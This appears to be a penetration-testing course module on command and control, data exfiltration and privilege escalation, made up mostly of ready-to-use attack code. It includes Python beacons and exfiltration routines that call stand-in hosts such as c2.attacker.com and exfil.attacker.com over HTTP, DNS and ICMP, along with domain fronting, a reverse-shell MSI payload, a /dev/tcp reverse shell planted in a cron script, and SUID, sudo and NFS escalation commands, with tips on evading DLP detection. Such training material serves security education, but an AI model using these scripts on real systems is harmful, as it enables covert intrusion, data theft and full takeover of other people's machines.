# Command and Control, Exfiltration, and Privilege Escalation

## Introduction

This module covers three critical aspects of advanced penetration testing: establishing reliable command and control (C2) infrastructure, exfiltrating data without detection, and escalating privileges to gain complete system control.

## Command and Control (C2)

### What is C2?

Command and Control infrastructure enables attackers to maintain communication with compromised systems, send commands, and receive data. A robust C2 system is essential for successful post-exploitation.

### C2 Architecture

```
[Attacker] → [Redirectors] → [C2 Server] ← [Compromised Systems]
                                ↓
                          [Data Storage]
```

### C2 Communication Channels

#### 1. HTTP/HTTPS

Most common and blends with normal traffic.

```python
# Simple HTTP beacon
import requests
import time

C2_SERVER = "https://c2.attacker.com"

while True:
    try:
        # Beacon to C2
        response = requests.get(f"{C2_SERVER}/beacon", 
                               headers={"User-Agent": "Mozilla/5.0..."})
        
        # Execute commands
        if response.status_code == 200:
            command = response.text
            result = execute_command(command)
            
            # Send results
            requests.post(f"{C2_SERVER}/results", data=result)
    except:
        pass
    
    # Sleep between beacons
    time.sleep(random.randint(300, 600))
```

#### 2. DNS

Covert channel using DNS queries.

```python
# DNS C2 beacon
import dns.resolver

def dns_beacon(data):
    # Encode data in subdomain
    encoded = base64.b64encode(data.encode()).decode()
    domain = f"{encoded}.c2.attacker.com"
    
    # Query DNS
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        # Command in TXT record
        return str(answers[0]).strip('"')
    except:
        return None
```

#### 3. ICMP

Using ping packets for C2.

```python
# ICMP C2
from scapy.all import *

def icmp_beacon():
    # Send ICMP with data in payload
    packet = IP(dst="c2.attacker.com")/ICMP()/Raw(load="beacon_data")
    response = sr1(packet, timeout=2)
    
    if response:
        return response[Raw].load
```

#### 4. Social Media

Using platforms as C2 channels.

```python
# Twitter C2 (example concept)
import tweepy

def twitter_c2():
    # Monitor specific hashtag for commands
    for tweet in tweepy.Cursor(api.search_tweets, q="#c2commands").items():
        if tweet.user.screen_name == "attacker_account":
            command = decode_command(tweet.text)
            result = execute_command(command)
            
            # Post results as reply
            api.update_status(f"@attacker_account {encode_result(result)}")
```

### C2 Frameworks

#### Metasploit Framework

```bash
# Set up listener
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 10.0.0.1
set LPORT 443
exploit -j

# Interact with session
sessions -i 1
```

#### Cobalt Strike

```bash
# Commercial C2 framework
# Features:
# - Malleable C2 profiles (customize traffic)
# - Beacon payload
# - Team server for collaboration
# - Advanced post-exploitation
# - Reporting capabilities

# Example Malleable C2 profile
http-get {
    set uri "/updates";
    client {
        header "User-Agent" "Mozilla/5.0...";
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type" "text/html";
        output {
            base64;
            print;
        }
    }
}
```

#### Empire/Starkiller

```bash
# PowerShell-based C2
# Start Empire
./empire

# Create listener
listeners
uselistener http
set Host http://10.0.0.1:8080
execute

# Generate stager
usestager windows/launcher_bat
set Listener http
execute

# Interact with agent
agents
interact <agent_name>
```

#### Covenant

```bash
# .NET C2 framework
# Web-based interface
# Features:
# - C# agents (Grunts)
# - Task scheduling
# - Built-in modules
# - Collaborative

# Access via web browser
http://localhost:7443
```

#### Sliver

```bash
# Modern C2 framework
# Start Sliver server
sliver-server

# Generate implant
generate --http c2.attacker.com --save /tmp/implant.exe

# Start listener
http --domain c2.attacker.com

# Interact with session
sessions
use <session_id>
```

### C2 Infrastructure Setup

#### Redirectors

```bash
# Apache mod_rewrite for redirector
<VirtualHost *:80>
    ServerName legitimate-domain.com
    
    # Redirect C2 traffic to actual C2 server
    RewriteEngine On
    RewriteCond %{REQUEST_URI} ^/beacon
    RewriteRule ^.*$ https://actual-c2-server.com%{REQUEST_URI} [P,L]
    
    # Redirect other traffic to legitimate site
    RewriteRule ^.*$ https://legitimate-site.com%{REQUEST_URI} [P,L]
</VirtualHost>
```

#### Domain Fronting

```python
# Use CDN to hide C2 server
import requests

# Actual C2 server
c2_server = "malicious-c2.com"

# CDN domain (appears in traffic)
cdn_domain = "cloudfront.net"

# Request with domain fronting
response = requests.get(
    f"https://{cdn_domain}/beacon",
    headers={
        "Host": c2_server,
        "User-Agent": "Mozilla/5.0..."
    }
)
```

## Data Exfiltration

### Exfiltration Techniques

#### 1. HTTP/HTTPS Exfiltration

```python
# Exfiltrate via HTTPS POST
import requests
import os

def exfiltrate_file(filepath):
    with open(filepath, 'rb') as f:
        files = {'file': f}
        requests.post(
            'https://exfil.attacker.com/upload',
            files=files,
            headers={'User-Agent': 'Mozilla/5.0...'}
        )

# Chunked exfiltration to avoid detection
def chunked_exfiltration(data, chunk_size=1024):
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        requests.post('https://exfil.attacker.com/data', 
                     data={'chunk': chunk, 'index': i})
        time.sleep(random.randint(60, 300))  # Random delay
```

#### 2. DNS Exfiltration

```python
# Exfiltrate via DNS queries
import dns.resolver
import base64

def dns_exfiltrate(data):
    # Encode data
    encoded = base64.b64encode(data).decode()
    
    # Split into chunks (DNS label limit: 63 chars)
    chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
    
    for i, chunk in enumerate(chunks):
        # Create DNS query
        domain = f"{chunk}.{i}.exfil.attacker.com"
        try:
            dns.resolver.resolve(domain, 'A')
        except:
            pass
        time.sleep(1)
```

#### 3. ICMP Exfiltration

```python
# Exfiltrate via ICMP packets
from scapy.all import *

def icmp_exfiltrate(data):
    # Split data into chunks
    chunk_size = 64
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        # Send ICMP packet with data
        packet = IP(dst="exfil.attacker.com")/ICMP()/Raw(load=chunk)
        send(packet)
        time.sleep(0.1)
```

#### 4. Cloud Storage Exfiltration

```python
# Exfiltrate to cloud storage
import boto3

# AWS S3
s3 = boto3.client('s3',
    aws_access_key_id='ACCESS_KEY',
    aws_secret_access_key='SECRET_KEY'
)

def s3_exfiltrate(filepath):
    s3.upload_file(filepath, 'exfil-bucket', os.path.basename(filepath))

# Google Drive
from google.oauth2 import service_account
from googleapiclient.discovery import build

def gdrive_exfiltrate(filepath):
    creds = service_account.Credentials.from_service_account_file('creds.json')
    service = build('drive', 'v3', credentials=creds)
    
    file_metadata = {'name': os.path.basename(filepath)}
    media = MediaFileUpload(filepath)
    service.files().create(body=file_metadata, media_body=media).execute()
```

#### 5. Steganography

```python
# Hide data in images
from PIL import Image
import numpy as np

def embed_data_in_image(image_path, data, output_path):
    img = Image.open(image_path)
    img_array = np.array(img)
    
    # Convert data to binary
    binary_data = ''.join(format(ord(c), '08b') for c in data)
    
    # Embed in LSB of pixels
    data_index = 0
    for i in range(img_array.shape[0]):
        for j in range(img_array.shape[1]):
            if data_index < len(binary_data):
                img_array[i][j][0] = (img_array[i][j][0] & 0xFE) | int(binary_data[data_index])
                data_index += 1
    
    result = Image.fromarray(img_array)
    result.save(output_path)
```

### Exfiltration Tools

- **DNSExfiltrator**: DNS-based data exfiltration
- **PyExfil**: Python exfiltration framework
- **Cloakify**: Data exfiltration via text obfuscation
- **Iodine**: IP over DNS tunnel

### Avoiding Detection

```python
# Throttle exfiltration rate
def throttled_exfiltration(data, max_rate_mbps=0.1):
    chunk_size = 1024  # 1KB chunks
    delay = (chunk_size * 8) / (max_rate_mbps * 1024 * 1024)
    
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        exfiltrate_chunk(chunk)
        time.sleep(delay)

# Encrypt exfiltrated data
from cryptography.fernet import Fernet

def encrypt_and_exfiltrate(data):
    key = Fernet.generate_key()
    cipher = Fernet(key)
    encrypted = cipher.encrypt(data)
    
    # Exfiltrate key separately
    exfiltrate_key(key)
    
    # Exfiltrate encrypted data
    exfiltrate_data(encrypted)
```

## Privilege Escalation

### Windows Privilege Escalation

#### 1. Kernel Exploits

```bash
# Check Windows version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Search for exploits
searchsploit windows kernel

# Example: MS16-032 (Secondary Logon Handle)
# Download and compile exploit
# Execute to gain SYSTEM privileges
```

#### 2. Service Exploits

```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Weak service permissions
accesschk.exe -uwcqv "Authenticated Users" *
sc qc <service_name>

# Modify service binary path
sc config <service_name> binpath= "C:\path\to\malicious.exe"
sc stop <service_name>
sc start <service_name>
```

#### 3. DLL Hijacking

```powershell
# Find DLL hijacking opportunities
# 1. Identify missing DLLs
procmon.exe  # Use Process Monitor

# 2. Check DLL search order
# Application directory
# System32
# System
# Windows directory
# Current directory
# PATH directories

# 3. Place malicious DLL in writable location
copy malicious.dll C:\Program Files\VulnerableApp\
```

#### 4. Registry Exploits

```powershell
# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 1, create MSI payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi -o payload.msi

# Install with elevated privileges
msiexec /quiet /qn /i payload.msi
```

#### 5. Token Impersonation

```powershell
# Juicy Potato (Windows Server 2016 and earlier)
JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c whoami > C:\output.txt" -t *

# PrintSpoofer (Windows 10/Server 2019)
PrintSpoofer.exe -i -c cmd

# RoguePotato
RoguePotato.exe -r 10.0.0.1 -e "cmd.exe" -l 9999
```

#### 6. Scheduled Tasks

```powershell
# List scheduled tasks
schtasks /query /fo LIST /v

# Check permissions
icacls C:\path\to\task\script.bat

# Modify task
echo "malicious command" > C:\path\to\task\script.bat
```

### Linux Privilege Escalation

#### 1. Kernel Exploits

```bash
# Check kernel version
uname -a
cat /proc/version

# Search for exploits
searchsploit linux kernel $(uname -r)

# Example: DirtyCow (CVE-2016-5195)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

#### 2. SUID/SGID Binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Exploit SUID binaries
# Example: find with SUID
find . -exec /bin/sh -p \; -quit

# GTFOBins for exploitation techniques
# https://gtfobins.github.io/
```

#### 3. Sudo Misconfigurations

```bash
# Check sudo permissions
sudo -l

# Common exploits:
# - sudo vim → :!sh
# - sudo less → !sh
# - sudo find → find . -exec /bin/sh \; -quit
# - sudo nmap → nmap --interactive; !sh

# Sudo version vulnerabilities
sudo --version
# CVE-2021-3156 (Baron Samedit)
```

#### 4. Cron Jobs

```bash
# List cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# Check for writable cron scripts
find /etc/cron* -type f -perm -o+w 2>/dev/null

# Modify writable cron script
echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> /path/to/cron/script.sh
```

#### 5. Path Hijacking

```bash
# Check PATH
echo $PATH

# If writable directory in PATH
export PATH=/tmp:$PATH

# Create malicious binary
echo "/bin/bash" > /tmp/ls
chmod +x /tmp/ls

# Wait for privileged user to run 'ls'
```

#### 6. Capabilities

```bash
# Find files with capabilities
getcap -r / 2>/dev/null

# Example: python with cap_setuid
# Create privilege escalation script
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### 7. NFS Shares

```bash
# Check NFS exports
cat /etc/exports

# If no_root_squash is set
# Mount from attacker machine
mkdir /tmp/nfs
mount -t nfs target:/share /tmp/nfs

# Create SUID binary
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# Execute on target
/share/bash -p
```

### Privilege Escalation Tools

#### Windows

```bash
# WinPEAS
winPEASany.exe

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
Seatbelt.exe -group=all

# SharpUp
SharpUp.exe

# Windows Exploit Suggester
python windows-exploit-suggester.py --database 2021-09-01-mssb.xls --systeminfo systeminfo.txt
```

#### Linux

```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# pspy (monitor processes without root)
./pspy64
```

## Best Practices

### C2 Infrastructure

1. **Use Redirectors**: Never expose C2 server directly
2. **Rotate Infrastructure**: Change domains/IPs regularly
3. **Blend In**: Mimic legitimate traffic patterns
4. **Encrypt Communications**: Always use encryption
5. **Implement Killswitches**: Ability to terminate C2
6. **Monitor Operations**: Track all C2 activity

### Data Exfiltration

1. **Encrypt Data**: Always encrypt before exfiltration
2. **Throttle Rate**: Avoid triggering DLP alerts
3. **Use Legitimate Channels**: Blend with normal traffic
4. **Compress Data**: Reduce exfiltration time
5. **Verify Integrity**: Ensure complete data transfer
6. **Clean Up**: Remove local copies after exfiltration

### Privilege Escalation

1. **Enumerate Thoroughly**: Check all vectors
2. **Test Safely**: Avoid crashing systems
3. **Document Findings**: Record all attempts
4. **Verify Success**: Confirm elevated privileges
5. **Maintain Access**: Establish persistence
6. **Report Responsibly**: Document for remediation

## Resources

- [MITRE ATT&CK - Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS](https://lolbas-project.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [Linux Privilege Escalation Guide](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

## Next Steps

After mastering C2, exfiltration, and privilege escalation, you'll learn how to document your findings professionally in penetration testing reports.

